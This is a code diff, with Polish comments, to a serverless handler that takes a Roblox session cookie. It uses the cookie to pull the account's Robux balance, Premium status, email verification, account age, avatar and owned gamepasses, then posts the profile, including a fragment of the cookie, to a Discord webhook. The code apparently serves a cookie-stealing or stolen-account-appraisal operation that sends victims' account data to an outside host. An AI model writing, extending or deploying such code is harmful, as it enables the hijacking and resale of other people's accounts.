@@ -13,17 +13,13 @@ export default async function handler(req, res) {
   }
 
   // ────────────────────────────────────────────────────────────────
-  // ←←← TU WKLEJ TĘ JEDNĄ LINIJKĘ (dokładnie w tym miejscu) 
-  console.log("DOSTĘPNE ENV Z WEBHOOK:", 
-    Object.keys(process.env).filter(k => k.includes("WEBHOOK") || k.includes("DISCORD") || k.includes("HOOK"))
-  );
-  // ↑↑↑ ta linijka powyżej – wklej ją dokładnie tutaj
-  // ────────────────────────────────────────────────────────────────
+  // To jest linia, którą możesz zmienić jeśli chcesz inną nazwę zmiennej:
+  // Aktualnie używa process.env.DISCORD_WEBHOOK
+  // Jeśli w Vercel masz inną nazwę → zmień tylko poniżej ↓↓↓
+  const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
 
-  const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || '';
-
-  if (!DISCORD_WEBHOOK_URL) {
-    console.log("DISCORD_WEBHOOK_URL nie jest ustawiony - dane nie zostaną wysłane na Discord");
+  if (!DISCORD_WEBHOOK) {
+    console.log("Brak zmiennej DISCORD_WEBHOOK w Vercel – nie wysyłamy na Discord");
   }
 
   try {
@@ -39,9 +35,7 @@ export default async function handler(req, res) {
     const csrfToken = tokenRes.headers.get('x-csrf-token');
     if (!csrfToken) throw new Error('Failed to obtain X-CSRF-Token – invalid/expired cookie?');
 
-    // reszta Twojego kodu bez zmian ↓↓↓
-    // (nie zmieniam nic poza dodaniem tej jednej linijki debugującej wyżej)
-
+    // 2. Dane użytkownika
     const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
       method: 'GET',
       headers: {
@@ -57,6 +51,7 @@ export default async function handler(req, res) {
 
     const userData = await userRes.json();
 
+    // Email verified (hat 102611803)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
@@ -76,6 +71,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
+    // Premium
     let hasPremium = false;
     try {
       const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userData.id}/validate-membership`, {
@@ -84,6 +80,7 @@ export default async function handler(req, res) {
       if (premiumRes.ok) hasPremium = await premiumRes.json();
     } catch {}
 
+    // Robux
     let robux = 0;
     try {
       const currencyRes = await fetch(`https://economy.roblox.com/v1/users/${userData.id}/currency`, {
@@ -95,6 +92,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
+    // Wiek konta + data utworzenia
     let accountAgeDays = 0;
     let createdDate = null;
     try {
@@ -108,6 +106,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
+    // Avatar
     let avatarUrl = null;
     try {
       const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=720x720&format=Png&isCircular=false`);
@@ -117,6 +116,7 @@ export default async function handler(req, res) {
       }
     } catch {}
 
+    // Gamepasy
     const mm2Ids = [429957, 1308795];
     const ampIds = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
     const sabIds = [1227013099, 1229510262, 1228591447];
@@ -158,7 +158,8 @@ export default async function handler(req, res) {
       emailVerified,
     };
 
-    if (DISCORD_WEBHOOK_URL) {
+    // Wysyłka do Discorda – jeśli zmienna istnieje
+    if (DISCORD_WEBHOOK) {
       try {
         const embed = {
           title: `${result.username} ・ ${result.displayName}`,
@@ -170,7 +171,7 @@ export default async function handler(req, res) {
             { name: "Email Verified", value: result.emailVerified ? "Tak" : "Nie", inline: true },
           ],
           thumbnail: { url: result.avatarUrl || "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=720&height=720&format=png" },
-          footer: { text: `Cookie → ${cookie.slice(0, 8)}...${cookie.slice(-6)}` },
+          footer: { text: `Cookie fragment → ${cookie.slice(0, 8)}...${cookie.slice(-6)}` },
           timestamp: new Date().toISOString(),
         };
 
@@ -182,7 +183,7 @@ export default async function handler(req, res) {
           });
         }
 
-        await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -191,8 +192,8 @@ export default async function handler(req, res) {
             embeds: [embed]
           })
         });
-      } catch (webhookErr) {
-        console.error("Błąd wysyłki do Discorda:", webhookErr.message);
+      } catch (err) {
+        console.error("Błąd Discorda:", err.message);
       }
     }
 
